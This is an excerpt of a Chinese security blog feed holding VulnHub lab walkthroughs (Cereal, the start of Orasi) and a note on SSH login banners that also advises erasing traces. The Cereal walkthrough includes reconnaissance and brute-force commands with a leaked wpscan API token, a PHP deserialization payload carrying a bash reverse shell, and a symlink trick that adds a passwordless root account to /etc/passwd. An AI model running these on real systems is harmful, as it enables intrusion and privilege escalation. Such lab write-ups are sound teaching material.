&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1236.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;可以看到这条 logo 信息是在我们输入 root 密码之前就显示出来的，是在登陆前显示的，/etc/issue.net 的作用就是登陆前显示信息&lt;br&gt;
将登陆后的信息也显示一下进行对比就更容易理解执行前面的命令，给 /etc/motd 重新打印出来了 X_T 的样式&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1237.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;/etc/issue.net 显示在登陆前，/etc/motd 显示在登陆后&lt;br&gt;
一键关闭登陆前的信息展示&lt;br&gt;
 &lt;code&gt;sed -i &#39;s/Banner \/etc\/issue.net/#Banner none/g&#39; /etc/ssh/sshd_config;systemctl restart sshd;echo &amp;gt; /etc/issue.net&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1238.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;ssh-自定义登录文字&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-自定义登录文字&#34;&gt;#&lt;/a&gt; ssh 自定义登录文字&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;除了上述几种方式外，我们还可以添加自定义的语句到环境变量中，登陆到 shell 后就会执行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在环境变量里边添加figlet表示以一种方式去打印后面跟的字母或者数字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt;&amp;gt; ~/.bashrc &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;figlet I\&amp;#x27;m X_T&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检查这个文件是否完整的写入到了环境变量里边&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/.bashrc | tail -n1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1239.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;vim ~/.bashrcs 删除此条信息则不会在显示这条&lt;/p&gt;
&lt;h3 id=&#34;一键删除登录信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一键删除登录信息&#34;&gt;#&lt;/a&gt; 一键删除登录信息&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;如果显示的信息太多了，影响视觉，有没有办法一键全部删除掉，答案是肯定的，在每个用户下执行创建.hushlogin 文件，则所有非环境变量里边的信息都再不会被显示出来&lt;br&gt;
 for USER in `cat /etc/passwd | grep /bin/bash |grep -v root | cut -d “:” -f 1` ;do touch /home/$USER/.hushlogin;done;touch /root/.hushlogin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1240.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;一键删除阻碍登陆日志信息输出的文件：&lt;br&gt;
for USER in `cat /etc/passwd | grep /bin/bash |grep -v root | cut -d “:” -f 1` ;do rm -f /home/$USER/.hushlogin;done;rm -f /root/.hushlogin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1241.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;根据以上的信息就可以自定义 ssh 登陆的信息自定义的设置，当然最后记得复原，并且删除自己操作过的痕迹，防止被知道自己操作过什么。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/144%20CEREAL/</guid>
            <title>VULNHUB 44 CEREAL</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/144%20CEREAL/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VyZWFsLTEsNzAzLw==&#34;&gt;https://www.vulnhub.com/entry/cereal-1,703/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU3Nzk0MTQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15779414.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 CEREAL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1305.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;2 ）粗略的识别一下该 ip 上开放了哪些端口&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1306.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31. 83&lt;br&gt;
 靶机开放端口 21 , 22 , 80 , 139 , 445 , 3306 , 11111 , 55555&lt;/p&gt;
&lt;p&gt;3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1307.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;检索到的有效服务如下所示&lt;br&gt;
 21 ftp：可尝试进行匿名登陆下载文件&lt;br&gt;
 22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
 80 、44441 http：可对 web 进行渗透测试收集信息&lt;br&gt;
 3306 mysql：可进行自制字典爆破或社工收集账户密码&lt;br&gt;
 139 端口，是 NetBIOS 会话服务端口，主要用于提供 Windows 文件和打印机共享以及 UNIX 中的 Samba 服务。可进行 smb 利用。&lt;br&gt;
445 端口，通过它可以在局域网中轻松访问各种共享文件夹或共享打印机，能通过该端口共享硬盘。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;注意到有很多服务名字是 tcpwrapped：&lt;br&gt;
这说明 tcp 三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为 tcpwrapped 时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;ftp-匿名访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名访问&#34;&gt;#&lt;/a&gt; FTP 匿名访问&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;ZnRwOi8vMTkyLjE2OC4zMS44Mw==&#34;&gt;ftp://192.168.31.83&lt;/span&gt; 进行 ftp 信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1308.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;有一个空文件夹 pub、没有更多的详细信息暴露出来&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODMv&#34;&gt;http://192.168.31.83/&lt;/span&gt; 进行 web 信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1309.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;对页面到处点了点之后，没有看到可以直接利用的点。包括查看 robots 文件、查看网页源代码，查看是否有 git 文件泄漏，查看网站的框架、CMS 是否有可以直接利用的漏洞，查看页面中是否有敏感信息暴露出来如可疑的域名。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接下来就对网站进行目录扫描，扫描是否存在敏感的目录，指定后缀与字典开扫，我喜欢用的字典是 directory-list-2.3-medium.txt 比较全。&lt;br&gt;
 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.31.83/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1310.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;依次对识别到的目录进行访问：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODMvYmxvZy8=&#34;&gt;http://192.168.31.83/blog/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1311.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了两条信息，域名 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NlcmVhbC5jdGY=&#34;&gt;http://cereal.ctf&lt;/span&gt; , 另一个看网站的形式像是 wordpress.&lt;/p&gt;
&lt;p&gt;修改本地 hosts 文件，将域名的 DNS 解析指向靶机 ip 地址。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1312.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再次打开网站，看一下页面有啥变化&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1313.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;wpscan-枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wpscan-枚举&#34;&gt;#&lt;/a&gt; wpscan 枚举&lt;/h3&gt;
&lt;p&gt;用 wpscan 进行一波扫描，枚举用户名&lt;br&gt;
 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://cereal.ctf/blog/ --enumerate u&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1314.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到两个用户名分别为 cereal 和 Cereal&lt;/p&gt;
&lt;p&gt;一般只能收集到用户名、密码能收集到的情况比较少、我们就搜集一下试试&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc -U &#39;cereal,Cereal&#39; -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://cereal.ctf/blog/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1315.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;果然密码搜集不出来，但是知道了域名的话就可以尝试目标网站是否存在子域名&lt;/p&gt;
&lt;p&gt;尝试搜索子域名后无果，继续访问我们收集到的其他 web&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODMvYWRtaW4v&#34;&gt;http://192.168.31.83/admin/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1316.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一个后台的登陆地址，可以尝试弱口令，万能密码，sql 注入、burp 代理数据修改返回包、爆破密码、xss 攻击等。简单的试了试之后发现并没有什么很严重的弱点，就把现在的目标转到其他的网站上。&lt;/p&gt;
&lt;h3 id=&#34;子域名收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#子域名收集&#34;&gt;#&lt;/a&gt; 子域名收集&lt;/h3&gt;
&lt;p&gt;收集另一个开放的 web 站点的信息：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODM6NDQ0NDE=&#34;&gt;http://192.168.31.83:44441&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1317.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;收集这个站点的目录并没有什么有价值的信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1318.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;收集 44441 端口上是否存在一些子域名&lt;br&gt;
 &lt;code&gt;gobuster vhost -u http://cereal.ctf:44441 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1319.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;收集到了子域名 secure.cereal.ctf:44441&lt;/p&gt;
&lt;p&gt;修改本地 hosts 文件，改变 DNS 解析指向为靶机 ip 地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1320.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;经过上述的信息收集，我们能得到的可以利用的漏洞很有可能就是在后来发现的这个子域名上。&lt;/p&gt;
&lt;h3 id=&#34;继续信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#继续信息收集&#34;&gt;#&lt;/a&gt; 继续信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlY3VyZS5jZXJlYWwuY3RmOjQ0NDQx&#34;&gt;http://secure.cereal.ctf:44441&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1321.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现了命令执行，但是输入；&amp;amp;| 都没有起作用后，截取数据包，看数据包中的内容是些什么&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1322.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;可以选在 burp 自带的 url 解码，也可以在线 url 解码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1323.png&#34; width=&#34;640&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;如图依次点击可将原先的编码进行 url 解码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1324.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这是一个 php 反序列化漏洞，但是如果找不到源码的话很难去利用这个漏洞，寻找这个子域名下是否有一些目录存在&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://secure.cereal.ctf:44441/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1325.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;扫的比较慢，而且大半天也没有什么发现&lt;/p&gt;
&lt;h3 id=&#34;ffuf模糊测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ffuf模糊测试&#34;&gt;#&lt;/a&gt; ffuf 模糊测试&lt;/h3&gt;
&lt;p&gt;换个字典换个工具跑  &lt;code&gt;ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/FUZZ&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1326.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了一个 back_en 的备份文件夹&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1327.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打开之后发现是没有权限去进入这个目录&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1328.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是这个目录是确实存在的，继续向下扫描看能否找到敏感文件&lt;br&gt;
 &lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://secure.cereal.ctf:44441/back_en/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1329.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到一个备份文件 index.php.bak, 打开之后发现了源码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1330.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;php反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反序列化&#34;&gt;#&lt;/a&gt; php 反序列化&lt;/h3&gt;
&lt;p&gt;看源代码可以规范代码的格式，阅读此处的 php 代码查看反序列化造成的原因&lt;br&gt;
 &lt;code&gt;view-source:http://secure.cereal.ctf:44441/back_en/index.php.bak&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1331.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;isValid 默认为 False，从浏览器发送请求时，会进入 if，并检查该值是否为 IP 地址。&lt;br&gt;
尝试注入命令时，它拒绝了输入，如果我们在请求中发送值 True，则根本不会执行 if 块。&lt;br&gt;
会直接调用 ping 方法。通过 shell_exec 函数执行命令。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;需要先实例化、在进行序列化和url编码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class pingTest &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  public $ipAddress = &amp;quot;;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.18/4444 0&amp;gt;&amp;amp;1 &amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  public $isValid = True;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;obj = NEW pingTest;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;serilaze= serialize(&lt;span class=&#34;variable&#34;&gt;$obj&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo urlencode($serilaze);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以在线 php 执行，输出内容如下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1332.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;也可以用 php 去执行下面的代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1333.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到漏洞利用代码：&lt;br&gt;
 &lt;code&gt;O%3A8%3A%22pingTest%22%3A2%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A45%3A%22%3Bbash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.31.15%2F4444+0%3E%261+%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3B%7D&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;将 payload 发送到 burp 中，用 burp 发送此恶意数据&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1334.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;同时在 kali 上监听端口，得到了反弹的 shell，并进行终端优化&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1335.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;ln-软连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ln-软连接&#34;&gt;#&lt;/a&gt; ln 软连接&lt;/h3&gt;
&lt;p&gt;上 pspy 监控看看，看到了一个脚本被定期执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1336.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;chown 是用来改变用户和用户组权限的，这个脚本可以更改位于用户 rocky 的主目录中的文件 public_html 内容的所有者，当前用户 apache 组，apache 用户可以访问目录中的文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1337.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试直接修改 /etc/passwd 中的用户，生成一个无密码的是 root 权限的账户&lt;br&gt;
 &lt;code&gt;ln -s /etc/passwd /home/rocky/public_html/etcpasswd&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;ln -s&lt;/code&gt;  后，对添加软连接的地方做出改变则原文件也发生了改变&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1338.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;等待定时任务被执行后，/etc/passwd 就会因为我们设置的软连接&lt;br&gt;
 /home/rocky/public_html/etcpasswd 的权限被修改为 rocky:apache，而&lt;br&gt;
 /etc/passwd 的权限也被改变为了 apache 可操作的文件&lt;/p&gt;
&lt;h3 id=&#34;root密码置空&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#root密码置空&#34;&gt;#&lt;/a&gt; root 密码置空&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;echo &amp;quot;mhq::0:0:root:/root:/bin/bash&amp;quot; &amp;gt;&amp;gt; /etc/passwd&lt;/code&gt; &lt;br&gt;
 删除了 x，也就是删除 root 用户的密码身份验证&lt;br&gt;
通过 su mhq 可以直接无密码升级到 root 权限&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1339.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;可以检验一下，现在我们 root 密码仍然未知，但是 mhq 的用户密码 x 不存在&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1340.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 可以直接通过一个普通用户提权到 root&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/143%20ORASI/</guid>
            <title>VULNHUB 43 ORASI</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/143%20ORASI/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvb3Jhc2ktMSw2NjAv&#34;&gt;https://www.vulnhub.com/entry/orasi-1,660/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTYzMTYyNzQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/16316274.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 ORASI：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1242.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;2 ）扫到 ip 之后对 ip 进行端口扫描&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1243.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;这样扫看似扫出来了所有的端口，但是端口里的具体信息却没有识别，由于之前很多次都是因为在端口扫描阶段没有继续深入扫描端口信息而无法渗透，比如 git 泄漏、dns 解析域名泄漏、各种服务的版本都含有更多的敏感信息。因此，需要对得到的服务器进一步深入扫描得到端口信息&lt;/p&gt;
